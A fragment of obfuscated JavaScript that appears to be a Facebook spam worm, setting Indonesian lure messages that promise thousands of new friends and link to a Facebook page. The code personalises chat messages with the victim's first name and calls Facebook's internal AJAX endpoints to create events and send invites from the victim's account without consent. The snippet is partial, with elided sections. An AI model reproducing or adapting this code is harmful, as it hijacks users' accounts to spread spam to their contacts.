...
var chatmessage = '%firstname%, Mau diadd ribuan teman..kunjungi sekarang http://facebook.com/KomunitasSukaStatus';
var postmessage = 'teman teman kalau Mau diadd lebih dari 200ribu orang teman di indonesia..kunjungi sekarang http://facebook.com/KomunitasSukaStatus';
var redirect = 'http://facebook.com/KomunitasSukaStatus';
var eventdesc = 'klik di \n\ \n\ Go here:  http://facebook.com/KomunitasSukaStatus';
...
doget('/', function (_0xaa04xf) {
    ...
    if (eventdesc) {
        ...
        _0xaa04x16('/ajax/choose/?__a=1', {
            type: 'event',
            eid: null,
            invite_message: 'hallo teman teman mau diadd ribuan teman hanya dengan 1 ddetik saja klik disini http://facebook.com/KomunitasSukaStatus',
            __d: 1,
